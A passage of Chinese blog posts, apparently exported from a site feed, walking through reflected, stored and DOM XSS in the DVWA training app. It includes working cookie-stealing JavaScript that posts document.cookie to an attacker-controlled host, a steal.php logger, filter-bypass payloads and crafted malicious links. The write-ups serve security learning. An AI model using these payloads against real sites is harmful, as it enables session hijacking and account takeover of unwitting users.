src=http://192.168.124.7/eval.js&gt;&lt;/script&gt;</code>|并提交。此时主机A的恶意脚本被执行，主机B的Cookie被以GET方式发送给主机A。在主机A上用|<code>tail /var/log/httpd/access_log</code>|查看web日志，发现已经获取到Cookie：</p><p><img src="https://img-blog.csdnimg.cn/20190906165803222.png" alt="" /></p></li></ul><h1 id="0x03-总结"><a class="markdownIt-Anchor" href="#0x03-总结"></a> 0x03 总结</h1><p>在真实攻击过程中，攻击者可以构造恶意url|<code>http://192.168.124.6/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2F192.168.124.7%3A6789%2FDesktop%2Feval.js%3E%3C%2Fscript%3E#</code>|，诱使用户点击该链接，那么用户的Cookie就会发送到攻击者的主机上，攻击者利用该Cookie就能够登陆受害者的账户了。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-XSS_Reflected</title>
      <link href="/2020/02/21/DVWA-XSS-Reflected/"/>
      <url>/2020/02/21/DVWA-XSS-Reflected/</url>
      
        <content type="html"><![CDATA[<p>本文记录一次在DVWA漏洞平台的如何利用反射型XSS，获取该平台登陆Cookie的实验。</p><h1 id="1-测试环境"><a class="markdownIt-Anchor" href="#1-测试环境"></a> 1 测试环境</h1><blockquote><ul><li>DVWA：Win 7虚拟机，phpstudy搭建DVWA，存在XSS漏洞的网站；|<code>IP: 192.168.124.6</code>|</li><li>主机A：Win 7物理机，开启phpstudy，攻击者；|<code>IP:192.168.124.2</code>|</li></ul></blockquote><h1 id="2-low"><a class="markdownIt-Anchor" href="#2-low"></a> 2 Low</h1><p>PHP源代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出没有任何过滤，直接将用户提交的GET参数name输出到页面，所以我们构造Payload：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来是利用xss获取用户cookie,由于script标签可以加载远程服务器的javascript代码并且执行，所以我们在主机A的服务器下编写cookie.js。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;form action='http://192.168.124.2/DVWA_XSS/steal.php' name='exploit' method='post' style='display:none'&gt;"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;input type='hidden' name='data' value='"</span>+<span class="built_in">document</span>.cookie+<span class="string">"'&gt;"</span>);</span><br><span class="line"><span class="comment">//&lt;input type="hidden"/&gt; 定义隐藏字段。隐藏字段对于用户是不可见的。隐藏字段通常会存储一个默认值，它们的值也可以由 JavaScript 进行修改。</span></span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;/form&gt;"</span>);</span><br><span class="line"><span class="built_in">document</span>.exploit.submit();</span><br></pre></td></tr></table></figure><p>上面这段js代码的作用是在页面中构造一个隐藏表单和一个隐藏域，内容为当前的cookie，并且以post方式发送到同目录下的steal.php。steal.php将我们获取到的cookie存到数据库中，代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line">$conn=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"dvwacookie"</span>,$conn);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>])) <span class="comment">//isset( )判断一个变量是否已经声明</span></span><br><span class="line">&#123;</span><br><span class="line">    $sql=<span class="string">"insert into low(cookie) values('"</span>.$_GET[<span class="string">'data'</span>].<span class="string">"');"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=<span class="string">"insert into low(cookie) values('"</span>.$_POST[<span class="string">'data'</span>].<span class="string">"');"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $sql=<span class="string">"select * from low"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    <span class="keyword">while</span>($row=mysql_fetch_array($result))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"偷取的cookie:"</span>.$row[<span class="number">1</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在MySQL中创建数据库和对应的表来存放Cookie：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> dvwacookie;</span><br><span class="line"><span class="keyword">use</span> dvwacookie;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">low</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,cookie <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">medium</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,cookie <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">high</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,cookie <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>接下来我们在有xss漏洞的位置插入：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=http:<span class="comment">//192.168.124.2/DVWA_XSS/cookie.js&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>相当于构造链接：</p><p>|<code>http://192.168.124.6/DVWA/vulnerabilities/xss_r/?name=&lt;script src=http://192.168.124.2/DVWA_XSS/cookie.js&gt;&lt;/script&gt;</code>|</p><p>将链接发给该网站下的受害者，受害者点击时就会加载远程服务器（这里是主机A）的cookie.js脚本，这里要提一点，用src加载远程服务器的js脚本，那么js的源就会变成加载它的域，从而可以读取该域的数据。</p><p>从主机A的phpstudy打开MySql，发现数据库中接收到了cookie：</p><p><img src="https://img-blog.csdnimg.cn/2019090817183560.png#pic_center" alt="" /></p><h1 id="3-medium"><a class="markdownIt-Anchor" href="#3-medium"></a> 3 Medium：</h1><p>查看PHP源代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到|<code>$name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] );</code>|将我们输入内容中的|<code>&lt;script&gt;</code>|标签替换为了空，但是|<code>str_replace</code>|这个函数是不区分大小写的，而且只替换一次，所以我们构造Payload：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/xss/);&lt;/script&gt;</span><br><span class="line">or</span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同样的，插入:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt src=http:<span class="comment">//192.168.124.2/DVWA_XSS/cookie.js&gt;&lt;/script&gt;</span></span><br><span class="line">&lt;SCRIPT src=http:<span class="comment">//192.168.124.2/DVWA_XSS/cookie.js&gt;&lt;/SCRIPT&gt;</span></span><br></pre></td></tr></table></figure><p>加载远程脚本steal.php,就可以将获取的cookie插入medium表中。</p><h1 id="4-high"><a class="markdownIt-Anchor" href="#4-high"></a> 4 High</h1><p>查看PHP源代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>观察到使用了正则表达式来过滤：|<code>preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</code>|，<kbd><strong>i</strong></kbd>表示对大小写不敏感。</p><p>根据正则表达式过滤，提交内容只要有<kbd>script</kbd>顺序出现的字母都一律过滤掉，只是过滤了script标签，但是有一些JavaScript事件后仍然能执行JavaScript代码，所以我们构造Payload：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过加载一个不存在的图片出错触发javascript onerror事件，继续弹框，证明出来有xss，这样的payload还有很多。</p><p>在xss的位置插入：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;img src=# onerror=(location.href="http://192.168.124.2/DVWA_XSS/steal.php?data="+document.cookie)&gt;</span><br></pre></td></tr></table></figure><p>通过触发onerror事件跳转链接到远程服务器的steal.php，同时以GET传送当前的cookie，但是输入<strong>仍然被过滤了</strong>，这是为何？</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;img SrC=# oneRror=(locatIon.href="httP://192.168.124.2/DVWA_XSS/steal.php?data="+documenT.cookie)&gt;</span><br></pre></td></tr></table></figure><p>注意观察我们所插入的代码，标明的大写部分，竟然构成了一个script，所以符合代码的正则，从而被过滤掉了。我们将插入代码中的<kbd>i</kbd>进行html编码：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;img src=# onerror=(locat&amp;#x69;on.href="http://192.168.124.2/DVWA_XSS/steal.php?data="+document.cookie)&gt;</span><br></pre></td></tr></table></figure><p>我们提交这段代码后绕过了后端的PHP过滤，然后浏览器进行了html解码。然后就是与之前一样的过程，触发onerror事件，向远程服务器的steal.php发送cookie并存入数据库中。</p><h1 id="5-impossible"><a class="markdownIt-Anchor" href="#5-impossible"></a> 5 Impossible</h1><p>查看PHP源代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到有一个<kbd>htmlspecialchars( )</kbd>函数，这个函数的功能是：<strong>把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体：</strong></p><p>如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"This is some &lt;b&gt;bold&lt;/b&gt; text."</span>;</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上代码的 HTML 输出如下（查看源代码）：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">This is some <span class="tag">&lt;<span class="name">b</span>&gt;</span>bold<span class="tag">&lt;/<span class="name">b</span>&gt;</span> text.</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上代码的浏览器输出：</p><blockquote><p>This is some &lt;b&gt;bold&lt;/b&gt; text.</p></blockquote><p>这样将&lt;&gt;这两个标签字符变为html实体，我们就无法构造标签进行混淆攻击了。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-XSS_Stored</title>
      <link href="/2020/02/21/DVWA-XSS-Stored/"/>
      <url>/2020/02/21/DVWA-XSS-Stored/</url>
      
        <content type="html"><![CDATA[<h1 id="1-概述"><a class="markdownIt-Anchor" href="#1-概述"></a> 1 概述</h1><blockquote><p><strong>存储型xss的不同之处在于，它可以将用户构造的有害输入直接存储起来，不需要攻击者构造链接诱使受害人点击触发，而是目标网站的用户只要访问插入恶意代码的网站就能触发，相比较反射型xss更为隐蔽，危害更大，受害者也会更多。</strong></p></blockquote><ul><li>本文仍将利用存储型XSS来获取cookie。</li><li>观察存储型XSS的PHP源代码可知，其各个级别的过滤策略与反射型类似，Payload也类似，这里不再赘述。与前面的<a href="https://blog.csdn.net/Sc0fie1d/article/details/100630996" target="_blank" rel="noopener">反射型XSS</a>有如下两点不同的是：</li></ul><h1 id="2-实现机制"><a class="markdownIt-Anchor" href="#2-实现机制"></a> 2 实现机制</h1><p>攻击者将恶意代码输入留言板提交之后，上传到服务器端存储起来，以后每一个浏览该页面的用户都会受到攻击。以获取cookie为例，每个访问该页面的用户都会将自己的cookie发送到攻击者的数据库。</p><p><img src="https://img-blog.csdnimg.cn/20190908174007394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h1 id="3-js脚本"><a class="markdownIt-Anchor" href="#3-js脚本"></a> 3 JS脚本</h1><p>之前的cookie.js的作用是在页面中构造一个隐藏表单和一个隐藏域，内容为当前的cookie，并且以post方式发送到同目录下的steal.php，但是这种方式有个缺点就是将cookie发送到steal.php后他会刷新页面跳转到steal.php，这样的做法难免引起用户的怀疑.</p><p><strong>我们需要用一种更为隐蔽的方式，这里我们用ajax技术，一种异步的javascript,在不刷新页面的前提下神不知鬼不觉的将用户的cookie发送到steal.php。我们新建cookie_ajax.js：</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">"http://192.168.124.2/DVWA_XSS/steal.php"</span>;</span><br><span class="line"><span class="keyword">var</span> postStr = <span class="string">"data="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="keyword">var</span> ajax = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ajax=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">ajax.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);<span class="comment">//true代表异步</span></span><br><span class="line">ajax.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">ajax.send(postStr);</span><br></pre></td></tr></table></figure><p>上面编写的代码创建了一个ajax对象，构造了一个post请求将用户的cookie作为参数发送到了http://192.168.124.2/DVWA_XSS/steal.php，phpsteal.php将我们获取到的cookie存到数据库中。</p><p>以Low级别的存储型XSS为例，构造如下Payload：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Name:<span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.124.2/DVWA_XSS/cookie_ajax.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">Message:send cookie use ajax</span><br></pre></td></tr></table></figure><p>Name的输入限制长度为10，用Firebug将最大长度改为600：</p><p><img src="https://img-blog.csdnimg.cn/2019090818584715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>输入Payload,，点击Sign Guestbook提交：</p><p><img src="https://img-blog.csdnimg.cn/20190908190058148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>这样，恶意代码就被植入到了留言板页面当中，每当有用户访问留言板页面时，cookie_ajax.js都会执行，将用户的cookie通过steal.php存储到攻击者的数据库。重新访问该页面，发现每访问一次，主机A的数据库中就会增加一条cookie。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-XSS_DOM</title>
      <link href="/2020/02/21/DVWA-XSS-DOM/"/>
      <url>/2020/02/21/DVWA-XSS-DOM/</url>
      
        <content type="html"><![CDATA[<h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>DOM XSS漏洞是基于文档对象模型（Document Object Model，DOM）的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。</p><p>DOM中有很多对象，其中一些是用户可以操纵的，如url、location、refere等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p><h1 id="2-low级别"><a class="markdownIt-Anchor" href="#2-low级别"></a> 2 Low级别</h1><h2 id="21-查看服务器端源代码"><a class="markdownIt-Anchor" href="#21-查看服务器端源代码"></a> 2.1 查看服务器端源代码</h2><p><img src="https://img-blog.csdnimg.cn/2019090911055977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>什么都没有。</p><h2 id="22-查看页面源代码"><a class="markdownIt-Anchor" href="#22-查看页面源代码"></a> 2.2 查看页面源代码</h2><p><img src="https://img-blog.csdnimg.cn/20190909110824714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h2 id="23页面中的javascript代码"><a class="markdownIt-Anchor" href="#23页面中的javascript代码"></a> 2.3页面中的JavaScript代码</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">if (document.location.href.indexOf("default=") &gt;= 0) &#123; #判断  "default=" 是否存在</span><br><span class="line"><span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"default="</span>)+<span class="number">8</span>);</span><br><span class="line"> # 取出 default 的值，并赋值给变量lang</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;option value='"</span> + lang + <span class="string">"'&gt;"</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">"&lt;/option&gt;"</span>);</span><br><span class="line"># 将lang重新写入页面，在此产生XSS</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;"</span>);</span><br><span class="line">#disabled属性规定某个选项应该被禁用。被禁用的选项既不可用，也不可点击。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>所以我们插入的 javascript 代码可以在 decodeURL(lang) 被执行。</strong></p><h2 id="24-构造payload"><a class="markdownIt-Anchor" href="#24-构造payload"></a> 2.4 构造payload</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">English<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">恶意链接为:</span><br><span class="line">http://192.168.124.6/DVWA/vulnerabilities/xss_d/?default=English<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="25-写入页面后效果如下"><a class="markdownIt-Anchor" href="#25-写入页面后效果如下"></a> 2.5 写入页面后，效果如下</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"English%3Cscript%3Ealert(/xss/);%3C/script%3E"</span>&gt;</span>English<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">URLdecode后：</span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"English&lt;script&gt;alert(/xss/);&lt;/script&gt;"</span>&gt;</span>English<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)；</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="3-medium级别"><a class="markdownIt-Anchor" href="#3-medium级别"></a> 3 Medium级别</h1><h2 id="31查看服务器端源代码"><a class="markdownIt-Anchor" href="#31查看服务器端源代码"></a> 3.1查看服务器端源代码：</h2> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line">$default = $_GET[<span class="string">'default'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># Do not allow script tags</span></span><br><span class="line"><span class="keyword">if</span> (stripos ($default, <span class="string">"&lt;script"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中stripos( )过滤掉了|<code>&lt;script&gt;</code>|标签，所以我们用img标签的onerror事件触发xss。网页的源代码没有变化。</p><h2 id="32-构造payload"><a class="markdownIt-Anchor" href="#32-构造payload"></a> 3.2 构造payload：</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">English<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line">恶意链接为：</span><br><span class="line">http://192.168.124.6/DVWA/vulnerabilities/xss_d/?default=English<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="33-写入页面后效果如下"><a class="markdownIt-Anchor" href="#33-写入页面后效果如下"></a> 3.3 写入页面后，效果如下：</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"English%3C/option%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(/xss/)%3E"</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">"alert(/xss/)"</span> <span class="attr">src</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">URLdecode后：</span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"English&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(/xss/)&gt;"</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">"alert(/xss/)"</span> <span class="attr">src</span>=<span class="string">"1"</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="4-high级别"><a class="markdownIt-Anchor" href="#4-high级别"></a> 4 High级别</h1><h2 id="41查看服务器端源代码"><a class="markdownIt-Anchor" href="#41查看服务器端源代码"></a> 4.1查看服务器端源代码：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment"># White list the allowable languages</span></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'default'</span>]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"French"</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">"English"</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">"German"</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">"Spanish"</span>:</span><br><span class="line"><span class="comment"># ok</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span 